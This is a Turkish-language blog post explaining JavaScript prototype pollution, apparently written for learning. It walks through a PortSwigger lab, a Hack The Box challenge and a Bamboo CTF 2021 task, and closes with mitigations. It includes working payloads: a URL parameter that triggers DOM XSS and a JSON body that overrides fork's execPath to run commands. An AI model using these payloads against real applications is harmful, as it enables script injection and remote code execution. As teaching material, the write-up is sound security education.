---
layout: post
title: Prototype Pollution
date: '2023-01-31 11:17:00 +0300'
categories: makaleler
---
# Prototype Pollution
Yazının medium'daki haline ulaşmak için -> [Buraya tıklayınız](https://jeustache.medium.com/prototype-pollution-a585e40e004a)

![img](https://miro.medium.com/max/700/0*gfpBhKEzd7YF6mYb.jpeg)

Prototype Pollution son yıllarda git gide daha çok karşımıza çıkan, duruma göre client-side’a XSS veya arka planda RCE tetikleyebilen bir zafiyettir. Bu yazıda çok genel ve basit bir şekilde bu zafiyeti anlatmaya çalışacağım. Yazının başında Prototype Pollution’un çalışma ve exploit edilme mantığını anlatırken sonlarına doğru ise gördüğüm hazır lab’lardan veya katıldığım CTF’lerden bulduğum örnekleri inceleyeceğim.

Prototype Pollution front-end’de pure javascript veya Angular, React, Vue.js gibi framework’lerin içinde karşımıza çıkabilir. Bu durumda genellikle DOM-XSS tetiklenir. Fakat bazı durumlarda back-end nodejs veya türevi bir yapı olduğu zaman back-end’de de tetiklebilir. Bu gibi durumlarda RCE gibi bir durum da oluşabilir.

JavaScript prototypal inheritance model kullanır. Bu yapı aslında günün sonunda herhangi bir class’tan bir obje oluşturulduğunda onun inherit aldığı başka bir class’ın olmasını sağlar. Örnek olarak herhangi bir string tanımladığımızda bu string String.prototype’dan inherit olur. Inherit’in tanımından da bildiğimiz gibi parent objesinin property ve method’larını alır. Dolayısıyla herhangi bir string String.prototype’ın sahip olduğu toLowerCase() method’una sahip olur.

```javascript
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);     // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```

Herhangi bir objenin property’si çağrıldığı zaman öncellikle objenin kendi property’lerine bakılır. Orada yoksa bir üst inherit aldığı prototype’ınınkilere bakılır. Tabii yapı gereği prototype alınan class’ın da prototype’ı olabilir. Bu yapı bir chain yaratır.

![img](https://miro.medium.com/max/668/1*z1Tv0vH9fJhzeFZPs9p45Q.png)

Yine aynı yapıda objelerin prototype’ına aşağıdaki gibi ulaşılabilir.

```javascript
username.__proto__;
username['__proto__'];

username.__proto__;                        // String.prototype
username.__proto__.__proto__;              // Object.prototype
username.__proto__.__proto__.__proto__;    // null
```

Client-Side’da karşımıza çıkan ve genellikle DOM-XSS ile sonuçlanan Prototype Pollution’da JavaScript kullanıcıdan gelen input’u bir objeyle birleştirir. Bu sayade saldırgan __proto__ gibi bir kullanım ile isteği yeri override etmeye çalışır. Bu da genellikle tüm objelerin inherit aldığı Object.prototype olur.

Back-end tarafında ise yine aynı şekilde node-js gibi backend’lerde duruma göre __proto__ aracılığı ile direk OS modülleri veya child process açıp orada komut çalıştırma gibi saldırı vektörleri kullanılabilir.

![img](https://miro.medium.com/max/626/0*XmamdDNyvC-jA1cy.gif)

**Örnekler üzerinden Prototype Pollution**

Lab : DOM XSS via client-side prototype pollution

Deneme yanılma yaparken direkt URL’e __proto__ vererek basit bir deneme yapıyoruz.

![img](https://miro.medium.com/max/700/1*sE-AlY_u0i11Z8CfyoX4JQ.png)

/?__proto__[can]=oztas

![img](https://miro.medium.com/max/700/1*EHc3OPcxRq3N6KlyqhH-kA.png)

Client-side’da Object.prototype çağırarak aslında bu özellikleri override edebildiğimizi doğruluyoruz.

Aslında tam bu anda kelimenin anlamından da gelen prototype’ı kirletmeyi başardık. Fakat bunun bir etkisi olması için client-side’daki DOM’a bir şeyler yapmamız gerekiyor. Sonuç olarak Client-Side JavaScripti daha iyi anlamamız gerekiyor.

![img](https://miro.medium.com/max/700/1*-l5EFwORiX65kNN1EbRr0Q.png)

Ön tarafı detaylı incelediğimiz zaman iki şey dikkatimiz çekiyor. öncelikle searchLogger.js içinde document.body’ye bir append yapılıyor. Ve bu append config objesinin transport_url property’sindeki değeri append ediyor. Biz bulduğumuz bu pollution ile transport_url’i override ettiğimiz zaman aslında DOM’a eklenen obje kullanıcının Prototype Pollute ettiği obje olacak. En basit haliyle ile bir DOM-XSS tetikleyeceğiz.

/?__proto__[transport_url]=data:,alert(1);

![img](https://miro.medium.com/max/485/1*63t7Fm8v9y7ZMKPMzPoh9w.png)

Hack The Box Web Challenge: Breaking Grad

Statik olarak baktığımızda router’ların iki tane endpointi olduğunu görüyoruz. /debug/:action ve /api/calculate

```javascript
const randomize         = require('randomatic');
const path              = require('path');
const express           = require('express');
const router            = express.Router();
const StudentHelper     = require('../helpers/StudentHelper');
const ObjectHelper      = require('../helpers/ObjectHelper');
const DebugHelper       = require('../helpers/DebugHelper');
router.get('/', (req, res) => {
    return res.sendFile(path.resolve('views/index.html'));
});
router.get('/debug/:action', (req, res) => {
    return DebugHelper.execute(res, req.params.action);
});
router.post('/api/calculate', (req, res) => {
    let student = ObjectHelper.clone(req.body);
    if (StudentHelper.isDumb(student.name) || !StudentHelper.hasBase(student.paper)) {
        return res.send({
            'pass': 'n' + randomize('?', 10, {chars: 'o0'}) + 'pe'
        });
    }
    return res.send({
        'pass': 'Passed'
    });
});
module.exports = router;
```

/api/calculate/ /helpers/ObjectHelper ait bir obje kullanıyor. ObjectHelper’a baktığımızda ise

```javascript
module.exports = {
    isObject(obj) {
        return typeof obj === 'function' || typeof obj === 'object';
    },
    isValidKey(key) {
        return key !== '__proto__';
    },
    merge(target, source) {
        for (let key in source) {
            if (this.isValidKey(key)){
                if (this.isObject(target[key]) && this.isObject(source[key])) {
                    this.merge(target[key], source[key]);
                } else {
                    target[key] = source[key];
                }
            }
        }
        return target;
    },
    clone(target) {
        return this.merge({}, target);
    }
}
```

merge kısmı Prototype Pollution’a işaret ediyor. Aslında POST gelen JSON

*{ ‘__proto__’: { ‘target_property’: ‘value’ } }*

olduğunda

*source.__proto__.target_property = ‘value’;*

olmuş olacak*.* Bu endpoint üzerinden objelere erişebileceğimiz anlamında geliyor. Aynı zamanda bu seferki örnekte back-end’deyiz. Dolayısıyla os ve benzeri kütüphane varsa içeride bunu override edip sadece XSS değil RCE de düşünebiliriz.

Bu örnekte __proto__’nun banlı bir keyword olduğunu görüyoruz. Bunun yerine constructor.prototype kullanabiliriz.

DebugHelper.js’i incelediğimiz zaman ise

```javascript
const { execSync, fork } = require('child_process');
module.exports = {
    execute(res, command) {
        res.type('txt');
        if (command == 'version') {
            let proc = fork('VersionCheck.js', [], {
                stdio: ['ignore', 'pipe', 'pipe', 'ipc']
            });
            proc.stderr.pipe(res);
            proc.stdout.pipe(res);
            return;
        } 
        
        if (command == 'ram') {
            return res.send(execSync('free -m').toString());
        }
        
        return res.send('invalid command');
    }
}
```

child_process açıldığını görüyoruz. Yani ilk endpointimize giden json

degisken.constructor.prototype olarak fork fonksiyonuna erişebilir. NodeJS fork’a bakınca

![img](https://miro.medium.com/max/700/1*rg8vFq1ow48H9DQGgCSYow.png)

böyle bir kullanımı olduğunu görüyoruz. Dolayısıyla JSON kabul eden endpointimize

```javascript
{
   "constructor": {
      "prototype": {
         "execPath": "ls",
         "execArgv": [
            "-la",
            "."
         ]
      }
   }
}
```

attığımız zaman karşı tarafta bir fork açılarak ls -la çalışacaktır.

Bamboo CTF 2021 Time to Draw

Son örneğimiz de 2021 Bamboo CTF’den olacak:

Burada userData.token değişkeni admin cookie’si olmadan undefined, yani biz bir üst class’ın token’ini override ettiğimiz zaman objemiz inherit alacağı için değeri ile beraber alacak. Prototype Pollution ile bunu manipüle etmiş olacağız.

![img](https://miro.medium.com/max/700/1*4tpHAamdu0rwtdQbCUElPg.png)

Tokenin aşağıdaki gibi oluştuğu bilgisine sahibiz, dolayısıyla kendimize ait custom token üretebiliriz.

```javascript
> var crypto = require('crypto');
undefined
> const hash = (token) => crypto.createHash("sha256").update(token).digest('hex');
undefined
> hash("42.29.23.221234567890123456")
'f6726c5dcd8635dd2ae8da8dcef74bdfca22c5a27e309ef7bec5f533a7b4ffb6'
>
```

![img](https://miro.medium.com/max/700/1*1w36p7Wzc_U4tGPqhni0Gw.png)

[[BambooCTF 2021\] web - SSRFrog, Time to Draw write-upSSRFrog If you see the view-source of html code, you can easily find the syntax below. FLAG is on this server…eine.tistory.com](https://eine.tistory.com/entry/BambooCTF-2021-web-SSRFrog-Time-to-Draw-write-up)

Sonuç

Bu yazıda Türkçe literatür ve kaynaklarda pek karşılaşmadığım Prototype Pollution’ı bildiğim kadarıyla açıkladım. Yazının en sonunu genel olarak Prototype Pollution’a karşı alınabilecek önlemler ile bitireceğim:

- -> Prototype Pollution payload’ları input sanitasyon süreçlerine dahil edilmedi.
- -> Recursive merge operasyonlarından elden geldikçe kaçınılmalı
- -> Object.freeze() method’u kullanımı tavsiye edilmektedir. Freeze olmuş objelerin property create, remove gibi işlemleri olmayacağından Prototype Pollution riski azalmaktadır.
- -> Objeleri prototype’sız yaratma seçeneği varsa tercih edilmeli, bu prototype chain yapısını da etkileyeceğinden Prototype Pollution riskini de azaltacaktır.

kaynaklar:

[Client-side prototype pollution-Web Security Academy](https://portswigger.net/web-security/prototype-pollution)

["NodeJS.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)

[Prototype Pollution to RCEprocess is spawned with some method from child_process (like fork or spawn or others) it calls the method…book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce)

[Client Side Prototype Pollution🎙️ HackTricks LIVE Twitch Wednesdays 5.30pm (UTC) 🎙️ - 🎥 Youtube 🎥 Discovering using Automatic tools Finding the…book.hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution)

[GitHub - BlackFan/client-side-prototype-pollution: Prototype Pollution and useful Script GadgetsIf you are unfamiliar with Prototype Pollution Attack, you should read the following first: JavaScript prototype…github.com](https://github.com/BlackFan/client-side-prototype-pollution)

[Exploiting Prototype PollutionsIntroduction:medium.com](https://medium.com/@zub3r.infosec/exploiting-prototype-pollutions-220f188438b2)

(https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)

---
**[Can ÖZTAŞ](https://www.linkedin.com/in/can-oztas/)**